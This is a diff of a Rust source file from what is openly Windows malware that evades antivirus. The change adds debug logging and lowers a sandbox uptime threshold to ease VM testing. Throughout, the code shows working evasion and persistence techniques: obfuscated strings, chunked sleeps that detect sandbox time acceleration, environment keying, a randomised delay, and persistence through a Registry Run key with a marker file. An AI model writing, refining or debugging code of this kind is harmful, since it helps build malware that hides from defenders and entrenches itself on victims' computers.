@@ -2,6 +2,7 @@
 //!
 //! Implements stealthy persistence mechanisms avoiding common AV signatures
 
+use crate::debug_print;
 use obfstr::obfstr;
 use std::env;
 #[cfg(target_os = "windows")]
@@ -718,8 +719,9 @@ const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
 const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
 #[cfg(target_os = "windows")]
 const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
-#[cfg(target_os = "windows")]
-const AUTO_PERSIST_MIN_UPTIME_MS: u64 = 600_000; // 10 minutes minimum uptime
+// Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
+// we've already waited 3-5 minutes, so the system has been up long enough if it passed
+// the initial environment checks. 10 minutes was too restrictive for VM testing.
 
 /// Marker file to check if persistence was already established in a previous run
 #[cfg(target_os = "windows")]
@@ -785,11 +787,13 @@ pub fn schedule_auto_persistence() {
 
     // Check if already done in this session
     if AUTO_PERSIST_DONE.load(Ordering::SeqCst) {
+        debug_print!("DEBUG: [AUTO-PERSIST] Already done in this session, skipping");
         return;
     }
 
     // Check if marker exists (persisted in previous run)
     if persistence_marker_exists() {
+        debug_print!("DEBUG: [AUTO-PERSIST] Marker file exists, already persisted in previous run");
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
         return;
     }
@@ -807,39 +811,76 @@ pub fn schedule_auto_persistence() {
         let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
         let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;
 
+        debug_print!(
+            "DEBUG: [AUTO-PERSIST] Starting with {}s delay ({}s base + {}s jitter)",
+            total_delay,
+            AUTO_PERSIST_BASE_DELAY_SECS,
+            jitter_secs
+        );
+
         // Sleep in chunks to avoid detection of long sleep calls
         // Some sandboxes hook Sleep() and fast-forward
         let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
         let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;
 
-        for _ in 0..chunks {
+        for chunk_num in 0..chunks {
             // Use real-time validation between chunks
             let start = std::time::Instant::now();
             std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));
 
+            let elapsed = start.elapsed().as_secs();
+            debug_print!(
+                "DEBUG: [AUTO-PERSIST] Sleep chunk {}/{} completed ({}s elapsed)",
+                chunk_num + 1,
+                chunks,
+                elapsed
+            );
+
             // Anti-time-acceleration check: if sleep completed too fast,
             // sandbox might be accelerating time - abort
-            if start.elapsed().as_secs() < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
+            if elapsed < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ❌ Time acceleration detected ({}s < {}s threshold), aborting",
+                    elapsed,
+                    AUTO_PERSIST_TIME_ACCEL_THRESHOLD
+                );
                 return; // Time acceleration detected, abort persistence
             }
         }
 
         if remainder > 0 {
+            debug_print!("DEBUG: [AUTO-PERSIST] Sleeping remainder {}s", remainder);
             std::thread::sleep(std::time::Duration::from_secs(remainder));
         }
+
+        debug_print!("DEBUG: [AUTO-PERSIST] Delay complete, running environment checks...");
 
         // ====================================================================
         // ENVIRONMENT KEYING: Additional sandbox checks before persistence
         // ====================================================================
         if !environment_check() {
+            debug_print!("DEBUG: [AUTO-PERSIST] ❌ Environment check failed, aborting");
             return; // Sandbox detected, abort silently
         }
 
-        // Additional check: system uptime should be substantial
+        debug_print!("DEBUG: [AUTO-PERSIST] ✅ Environment check passed");
+
+        // Additional check: system uptime should be at least 3 minutes
+        // By this point we've already waited 3-5 minutes, so this is a sanity check
         let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
-        if uptime_ms < AUTO_PERSIST_MIN_UPTIME_MS {
-            return; // Freshly booted system (< 10 min uptime), likely sandbox
+        if uptime_ms < MIN_UPTIME_MS {
+            debug_print!(
+                "DEBUG: [AUTO-PERSIST] ❌ Uptime too low ({}ms < {}ms), aborting",
+                uptime_ms,
+                MIN_UPTIME_MS
+            );
+            return; // Freshly booted system, likely sandbox
         }
+
+        debug_print!(
+            "DEBUG: [AUTO-PERSIST] ✅ Uptime check passed ({}ms)",
+            uptime_ms
+        );
 
         // ====================================================================
         // STEALTH PERSISTENCE: Use registry method (most reliable)
@@ -850,13 +891,22 @@ pub fn schedule_auto_persistence() {
         // 3. Less monitored than WMI subscriptions
         // 4. Works on all Windows versions
 
+        debug_print!("DEBUG: [AUTO-PERSIST] Establishing registry persistence...");
+
         // Mark as done first to prevent race conditions
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
         // Establish persistence
-        if let Ok(_) = establish_persistence(PersistenceMethod::RegistryRun) {
-            // Create marker to avoid re-persisting on next run
-            create_persistence_marker();
+        match establish_persistence(PersistenceMethod::RegistryRun) {
+            Ok(msg) => {
+                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Persistence established: {}", msg);
+                // Create marker to avoid re-persisting on next run
+                create_persistence_marker();
+                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
+            }
+            Err(e) => {
+                debug_print!("DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}", e);
+            }
         }
     });
 }
